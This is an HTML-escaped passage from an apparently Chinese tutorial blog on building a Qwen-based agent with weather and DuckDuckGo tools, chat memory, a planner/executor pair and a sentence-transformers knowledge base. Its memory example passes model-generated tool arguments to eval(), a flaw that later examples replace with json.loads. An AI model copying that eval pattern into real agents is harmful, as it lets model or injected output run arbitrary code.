JSON\u0026#34; # 提取结果（DuckDuckGo 的 JSON 结构与 SearXNG 不同） summary = [] # 1. 优先取 \u0026#34;Abstract\u0026#34;（摘要） if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) # 2. 再取 \u0026#34;RelatedTopics\u0026#34;（相关主题）的前 2 条 for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) if not summary: return \u0026#34;未找到相关搜索结果\u0026#34; return \u0026#34;\\n\u0026#34;.join(summary) 实现记忆功能（Memory） 功能：你的 Agent 必须能够记住之前的对话内容，并在后续的交互中利用这些信息。\n用户交互示例：\n用户：“今天上海天气怎么样？” Agent：“上海今天晴，气温 25 度。” 用户：“那明天呢？” Agent 必须能够理解“那明天呢？”是关于“上海天气”的追问，并给出正确的答案。 记忆管理：用 message[] 存储以前对话的信息\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 messages = [] While True: ... messages.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # 调用的时候再传入 messages ... # 调用结束，结果再传入 messages messages.append({ \u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: response_message.content, \u0026#34;tool_calls\u0026#34;: [ { \u0026#34;id\u0026#34;: tc.id, \u0026#34;type\u0026#34;: tc.type, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: tc.function.name, \u0026#34;arguments\u0026#34;: tc.function.arguments } } for tc in response_message.tool_calls ] if response_message.tool_calls else None }) 完整示例代码 将工具调用、记忆整合：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 import os import requests from bs4 import BeautifulSoup from openai import OpenAI # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;...\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 天气查询工具 WEATHER_API_KEY = \u0026#34;...\u0026#34; # 需注册聚合数据等平台获取 def get_weather(city: str) -\u0026gt; str: url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; response = requests.get(url) data = response.json() if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; # 网络搜索工具 # SEARXNG_URL = \u0026#34;http://8.137.38.223:8081/\u0026#34; # 用不了 def web_search(query: str) -\u0026gt; str: # DuckDuckGo 免费搜索 API（无需注册，直接使用） url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, # 不返回 HTML 内容 \u0026#34;no_redirect\u0026#34;: 1 # 不返回跳转链接 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() # 检查 HTTP 状态码（如 404、500 会报错） except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except requests.exceptions.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的 JSON\u0026#34; # 提取结果（DuckDuckGo 的 JSON 结构与 SearXNG 不同） summary = [] # 1. 优先取 \u0026#34;Abstract\u0026#34;（摘要） if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) # 2. 再取 \u0026#34;RelatedTopics\u0026#34;（相关主题）的前 2 条 for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) if not summary: return \u0026#34;未找到相关搜索结果\u0026#34; return \u0026#34;\\n\u0026#34;.join(summary) #核心，调用 AI # 初始化对话记忆（上下文） messages = [] while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入记忆 messages.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # 调用模型生成响应（可能包含工具调用） response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages, tools=[ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询指定城市的实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;城市名称，如北京、上海\u0026#34;} }, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词相关信息\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;搜索关键词\u0026#34;} }, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ], tool_choice=\u0026#34;auto\u0026#34;, # 让 AI 自己决定是否调用 tools ) response_message = response.choices[0].message # 将模型的响应消息（含 tool_calls）加入 messages messages.append({ \u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: response_message.content, \u0026#34;tool_calls\u0026#34;: [ { \u0026#34;id\u0026#34;: tc.id, \u0026#34;type\u0026#34;: tc.type, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: tc.function.name, \u0026#34;arguments\u0026#34;: tc.function.arguments } } for tc in response_message.tool_calls ] if response_message.tool_calls else None }) # 处理工具调用 if response_message.tool_calls: for tool_call in response_message.tool_calls: function_name = tool_call.function.name function_args = eval(tool_call.function.arguments) # 调用工具 if function_name == \u0026#34;get_weather\u0026#34;: tool_result = get_weather(**function_args) elif function_name == \u0026#34;web_search\u0026#34;: tool_result = web_search(** function_args) else: tool_result = f\u0026#34;未知工具：{function_name}\u0026#34; # 工具结果加入 messages（确保 tool_call_id 正确） messages.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, # 对应前置 tool_calls 的 id \u0026#34;name\u0026#34;: function_name, \u0026#34;content\u0026#34;: tool_result }) # 生成最终回答 final_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages, ) print(f\u0026#34;AI：{final_response.choices[0].message.content}\u0026#34;) else: # 无工具调用，直接输出 print(f\u0026#34;AI：{response_message.content}\u0026#34;) 效果：\n多 Agent 协同工作 场景：设计至少两个不同的 Agent 角色，让它们在完成一个共同任务时能够互相协作。 参考 openai-sdk 文档：编排多个 Agents - OpenAI Agents SDK - 中文文档\n实现要点：\n需要设计一个消息总线或队列，让 Agent A 能把任务指令发给 Agent B，Agent B 也能把结果回传给 Agent A。 每个 Agent 需要有角色专属的 Prompt（提示词），让其记住自己的分工 工具需要有统一的调用接口 Agent 角色设计： Agent A（规划者）：负责分解任务，将任务分配给其他 Agent，并综合最终结果。 Agent B（执行者）：专门负责调用工具和执行具体操作。 协作流程示例： 用户：“请帮我查一下，北京明天的天气，然后告诉我这个城市都有哪些著名的 IT 公司。” **Agent A（规划者）**接收请求，将其分解为两个子任务： 子任务1：查询北京明天的天气。 子任务2：查询北京的著名 IT 公司。 Agent A 将子任务1分配给Agent B（执行者），要求其调用“天气查询工具”。 Agent A 再次将子任务2分配给Agent B，要求其调用“网络搜索工具”。 Agent A 收到两个子任务的执行结果后，将它们整合，并以流畅的语言回答用户。 与平时的代码不同，用 Agent 需要把部分代码功能交给 Ai 去处理\n完整示例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 import os import json import requests from openai import OpenAI # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;...\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 工具定义 WEATHER_API_KEY = \u0026#34;...\u0026#34; def get_weather(city: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询指定城市的实时天气\u0026#34;\u0026#34;\u0026#34; url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; try: response = requests.get(url, timeout=10) response.raise_for_status() data = response.json() except requests.exceptions.RequestException as e: return f\u0026#34;天气查询请求失败：{str(e)}\u0026#34; except json.JSONDecodeError: return \u0026#34;天气查询结果解析失败：返回内容不是有效的JSON\u0026#34; if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; def web_search(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;使用DuckDuckGo进行网络搜索\u0026#34;\u0026#34;\u0026#34; url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, \u0026#34;no_redirect\u0026#34;: 1 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except json.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的JSON\u0026#34; summary = [] if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) return \u0026#34;\\n\u0026#34;.join(summary) if summary else \u0026#34;未找到相关搜索结果\u0026#34; # Agent 角色定义（关键修改：明确Agent B只返回结果） AGENT_A_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent A，任务规划者。职责： 1. 分析用户请求，拆解为需要执行的子任务（每个子任务对应一个工具调用） 2. 为每个子任务指定需要调用的工具（get_weather 或 web_search）和参数 3. 等待所有子任务执行完成后，整合结果并以自然语言回复用户 重要规则： - 当需要工具调用时，必须生成明确的 tool_call - 不要自己执行工具调用 - 工具调用结果会通过 tool_response 反馈给你\u0026#34;\u0026#34;\u0026#34; AGENT_B_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent B，任务执行者。职责： 1. 接收 Agent A 的子任务指令 2. 严格按指令调用指定工具（get_weather 或 web_search） 3. 仅返回工具调用的原始结果，不要添加任何解释或格式化 重要规则： - 你不需要生成 tool_call - 直接返回工具函数的执行结果字符串 - 结果必须是纯文本，不要包含JSON或其他结构\u0026#34;\u0026#34;\u0026#34; # 初始化Agent A的对话记忆（关键：保留完整上下文） messages_a = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_A_PROMPT}] # 工具列表定义 tools = [ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询城市实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } } ] def main(): # Agent B 的上下文只需初始化一次 messages_b = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_B_PROMPT}] while True: user_input = input(\u0026#34;\\n你：\u0026#34;) if user_input.lower() in [\u0026#34;exit\u0026#34;, \u0026#34;quit\u0026#34;, \u0026#34;退出\u0026#34;]: print(\u0026#34;AI：拜拜~\u0026#34;) break # 将用户输入加入Agent A的上下文 messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_input}) # Agent A：拆解任务并生成工具调用计划 while True: # 循环处理多轮工具调用 agent_a_response = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, messages=messages_a, tools=tools, tool_choice=\u0026#34;auto\u0026#34; ) agent_a_msg = agent_a_response.choices[0].message messages_a.append(agent_a_msg) # 检查是否需要工具调用 if not agent_a_msg.tool_calls: # 无需工具调用，直接输出结果 print(f\u0026#34;AI：{agent_a_msg.content}\u0026#34;) break # 处理所有工具调用 tool_results = [] for tool_call in agent_a_msg.tool_calls: func_name = tool_call.function.name try: func_args = json.loads(tool_call.function.arguments) except json.JSONDecodeError: tool_results.append(f\u0026#34;工具调用参数解析失败：{tool_call.function.arguments}\u0026#34;) continue # Agent B 执行工具调用（关键：直接调用工具函数） print(f\u0026#34;正在执行: {func_name}({func_args})...\u0026#34;) if func_name == \u0026#34;get_weather\u0026#34;: result = get_weather(**func_args) elif func_name == \u0026#34;web_search\u0026#34;: result = web_search(**func_args) else: result = f\u0026#34;未知工具：{func_name}\u0026#34; tool_results.append(result) # 将结果反馈给 Agent A messages_a.append({ \u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool_call.id, \u0026#34;name\u0026#34;: func_name, \u0026#34;content\u0026#34;: result }) # 清空 Agent B 的上下文（仅保留系统提示） messages_b = [messages_b[0]] # 保存最终回复到上下文 if agent_a_msg.content: messages_a.append({\u0026#34;role\u0026#34;: \u0026#34;assistant\u0026#34;, \u0026#34;content\u0026#34;: agent_a_msg.content}) if __name__ == \u0026#34;__main__\u0026#34;: main() 不知道为什么搜索又出了问题\n实现任意形式的知识库 功能：构建一个外部知识库（可以是简单的文本文件、Markdown 文档，甚至一个小型数据库）。 集成：将知识库集成到你的 Agent 系统中，使其能够通过检索知识库来回答问题。 用户交互示例： 用户：“什么是 DevOps？” Agent 能够通过检索你提供的知识库，而不是纯粹依赖 LLM 的通用知识，来回答这个问题。这展示了 Agent 能够利用私有数据或特定领域数据来提供更精确和定制化的答案。 实现：\n需要用到预训练模型（这里用paraphrase-multilingual-MiniLM-L12-v2）来识别语义，将语义相近的文本转化为数值相近的向量\n导入 SentenceTransformer 模型 需要手动处理模型，将文本处理成可理解的嵌入向量\n还有用向量计算内容相关性等知识……不太懂\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 大致的关键代码 def __init__(self, kb_path=\u0026#34;knowledge_base.md\u0026#34;): self.kb_path = kb_path # 知识库文件路径 self.model = SentenceTransformer(\u0026#39;paraphrase-multilingual-MiniLM-L12-v2\u0026#39;) # 加载预训练模型 self.entries = [] # 存储解析后的知识库条目（标题+文本） self.embeddings = [] # 存储文本的嵌入向量（计算机可理解的“数字表示”） self.load_and_process() # 启动加载与处理流程 # 还需要手动处理 entry、text 等内容 def load_and_process(self): # 检查文件是否存在，不存在则创建示例知识库 if not os.path.exists(self.kb_path): self.create_sample_kb() # 读取文件内容 with open(self.kb_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() # 按Markdown标题分割条目（核心解析逻辑） entries = re.split(r\u0026#39;\\n# \u0026#39;, content) # 用“换行+# ”分割内容（Markdown一级标题格式） if entries and entries[0].strip() == \u0026#39;\u0026#39;: # 处理开头可能的空字符串 entries = entries[1:] # 提取每个条目的标题和文本，存入self.entries for entry in entries: lines = entry.split(\u0026#39;\\n\u0026#39;, 1) # 按第一个换行分割（标题和正文分离） title = lines[0].strip() # 标题（如“DevOps”） text = lines[1].strip() if len(lines) \u0026gt; 1 else \u0026#34;\u0026#34; # 正文内容 self.entries.append({\u0026#34;title\u0026#34;: title, \u0026#34;text\u0026#34;: text}) # 生成嵌入 if self.entries: # 将每个条目的“标题+文本”拼接成完整字符串 texts = [f\u0026#34;{e[\u0026#39;title\u0026#39;]}: {e[\u0026#39;text\u0026#39;]}\u0026#34; for e in self.entries] # 用模型将文本转化为向量（嵌入），存储到 self.embeddings self.embeddings = self.model.encode(texts, convert_to_tensor=True) 完整示例代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 import os import json import requests import re from openai import OpenAI from sentence_transformers import SentenceTransformer import torch # 初始化 OpenAI 客户端 client = OpenAI( api_key=\u0026#34;......\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) # 工具定义 WEATHER_API_KEY = \u0026#34;......\u0026#34; def get_weather(city: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询指定城市的实时天气\u0026#34;\u0026#34;\u0026#34; url = f\u0026#34;http://apis.juhe.cn/simpleWeather/query?city={city}\u0026amp;key={WEATHER_API_KEY}\u0026#34; try: response = requests.get(url, timeout=10) response.raise_for_status() data = response.json() except requests.exceptions.RequestException as e: return f\u0026#34;天气查询请求失败：{str(e)}\u0026#34; except json.JSONDecodeError: return \u0026#34;天气查询结果解析失败：返回内容不是有效的JSON\u0026#34; if data.get(\u0026#34;reason\u0026#34;) == \u0026#34;查询成功!\u0026#34;: result = data[\u0026#34;result\u0026#34;] return (f\u0026#34;{city}当前天气：{result[\u0026#39;realtime\u0026#39;][\u0026#39;info\u0026#39;]}，\u0026#34; f\u0026#34;温度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;temperature\u0026#39;]}℃，\u0026#34; f\u0026#34;湿度：{result[\u0026#39;realtime\u0026#39;][\u0026#39;humidity\u0026#39;]}%\u0026#34;) return f\u0026#34;查询天气失败：{data.get(\u0026#39;reason\u0026#39;, \u0026#39;未知错误\u0026#39;)}\u0026#34; def web_search(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;使用DuckDuckGo进行网络搜索\u0026#34;\u0026#34;\u0026#34; url = \u0026#34;https://api.duckduckgo.com/\u0026#34; params = { \u0026#34;q\u0026#34;: query, \u0026#34;format\u0026#34;: \u0026#34;json\u0026#34;, \u0026#34;no_html\u0026#34;: 1, \u0026#34;no_redirect\u0026#34;: 1 } try: response = requests.get(url, params=params, timeout=10) response.raise_for_status() except requests.exceptions.RequestException as e: return f\u0026#34;搜索请求失败：{str(e)}\u0026#34; try: data = response.json() except json.JSONDecodeError: return \u0026#34;搜索结果解析失败：返回内容不是有效的JSON\u0026#34; summary = [] if data.get(\u0026#34;Abstract\u0026#34;): summary.append(f\u0026#34;摘要：{data[\u0026#39;Abstract\u0026#39;]}\u0026#34;) for topic in data.get(\u0026#34;RelatedTopics\u0026#34;, [])[:2]: if \u0026#34;Text\u0026#34; in topic: summary.append(f\u0026#34;- {topic[\u0026#39;Text\u0026#39;]}\u0026#34;) return \u0026#34;\\n\u0026#34;.join(summary) if summary else \u0026#34;未找到相关搜索结果\u0026#34; class KnowledgeBase: \u0026#34;\u0026#34;\u0026#34;简单的知识库系统，支持语义搜索\u0026#34;\u0026#34;\u0026#34; def __init__(self, kb_path=\u0026#34;knowledge_base.md\u0026#34;): self.kb_path = kb_path self.model = SentenceTransformer(\u0026#39;paraphrase-multilingual-MiniLM-L12-v2\u0026#39;) self.entries = [] self.embeddings = None # 初始化为None self.load_and_process() def load_and_process(self): \u0026#34;\u0026#34;\u0026#34;加载知识库文件并生成嵌入向量\u0026#34;\u0026#34;\u0026#34; if not os.path.exists(self.kb_path): # 创建示例知识库 self.create_sample_kb() with open(self.kb_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() # 按Markdown标题分割条目 entries = re.split(r\u0026#39;\\n# \u0026#39;, content) if entries and entries[0].strip() == \u0026#39;\u0026#39;: entries = entries[1:] self.entries = [] for entry in entries: lines = entry.split(\u0026#39;\\n\u0026#39;, 1) title = lines[0].strip() text = lines[1].strip() if len(lines) \u0026gt; 1 else \u0026#34;\u0026#34; self.entries.append({\u0026#34;title\u0026#34;: title, \u0026#34;text\u0026#34;: text}) # 生成嵌入 if self.entries: texts = [f\u0026#34;{e[\u0026#39;title\u0026#39;]}: {e[\u0026#39;text\u0026#39;]}\u0026#34; for e in self.entries] self.embeddings = self.model.encode(texts, convert_to_tensor=True) else: self.embeddings = None def create_sample_kb(self): \u0026#34;\u0026#34;\u0026#34;创建示例知识库，不存在时调用\u0026#34;\u0026#34;\u0026#34; sample_kb = \u0026#34;\u0026#34;\u0026#34;# DevOps DevOps 是什么呢？ \u0026#34;\u0026#34;\u0026#34; with open(self.kb_path, \u0026#39;w\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: f.write(sample_kb) print(f\u0026#34;已创建示例知识库文件: {self.kb_path}\u0026#34;) def search(self, query, top_k=2): \u0026#34;\u0026#34;\u0026#34;搜索知识库，返回最相关的条目\u0026#34;\u0026#34;\u0026#34; if not self.entries or self.embeddings is None: return [{\u0026#34;title\u0026#34;: \u0026#34;知识库为空\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;没有可用的知识库条目\u0026#34;, \u0026#34;score\u0026#34;: 0.0}] query_embedding = self.model.encode([query], convert_to_tensor=True) # 计算余弦相似度 cos_scores = torch.nn.functional.cosine_similarity( query_embedding, self.embeddings ) # 获取top_k结果 top_results = torch.topk(cos_scores, k=min(top_k, len(cos_scores))) results = [] for idx, score in zip(top_results.indices, top_results.values): if score \u0026gt; 0.3: # 设置相似度阈值 results.append({ \u0026#34;title\u0026#34;: self.entries[idx][\u0026#34;title\u0026#34;], \u0026#34;text\u0026#34;: self.entries[idx][\u0026#34;text\u0026#34;], \u0026#34;score\u0026#34;: float(score) }) return results # 初始化知识库 kb = KnowledgeBase() def query_knowledge_base(query: str) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;查询知识库并返回格式化结果\u0026#34;\u0026#34;\u0026#34; results = kb.search(query) if not results or (len(results) == 1 and results[0][\u0026#34;title\u0026#34;] == \u0026#34;知识库为空\u0026#34;): return \u0026#34;在知识库中未找到相关信息\u0026#34; response = \u0026#34;【知识库检索结果】\\n\u0026#34; for i, res in enumerate(results, 1): response += f\u0026#34;\\n{i}. {res[\u0026#39;title\u0026#39;]}\\n{res[\u0026#39;text\u0026#39;]}\\n相似度: {res[\u0026#39;score\u0026#39;]:.2f}\\n\u0026#34; return response # 角色定义 AGENT_A_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent A，任务规划者。职责： 1. 分析用户请求，拆解为需要执行的子任务（每个子任务对应一个工具调用） 2. 为每个子任务指定需要调用的工具（get_weather、web_search 或 query_knowledge_base）和参数 3. 等待所有子任务执行完成后，整合结果并以自然语言回复用户 重要规则： - 当用户询问特定领域知识（如技术概念、公司内部信息等）时，优先使用 query_knowledge_base 工具 - 当需要实时信息（如天气、新闻）时，使用 get_weather 或 web_search - 不要自己编造知识库中没有的信息 - 工具调用结果会通过 tool_response 反馈给你\u0026#34;\u0026#34;\u0026#34; AGENT_B_PROMPT = \u0026#34;\u0026#34;\u0026#34;你是 Agent B，任务执行者。职责： 1. 接收 Agent A 的子任务指令 2. 严格按指令调用指定工具（get_weather、web_search 或 query_knowledge_base） 3. 仅返回工具调用的原始结果，不要添加任何解释或格式化 重要规则： - 你不需要生成 tool_call - 直接返回工具函数的执行结果字符串 - 结果必须是纯文本，不要包含JSON或其他结构\u0026#34;\u0026#34;\u0026#34; # 初始化Agent A的对话记忆 messages_a = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: AGENT_A_PROMPT}] # 工具列表定义（新增知识库查询工具） tools = [ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询城市实时天气\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;city\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;city\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;web_search\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;网络搜索关键词\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: {\u0026#34;query\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}}, \u0026#34;required\u0026#34;: [\u0026#34;query\u0026#34;] } } }, { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;query_knowledge_base\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;查询内部知识库获取特定领域知识\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, 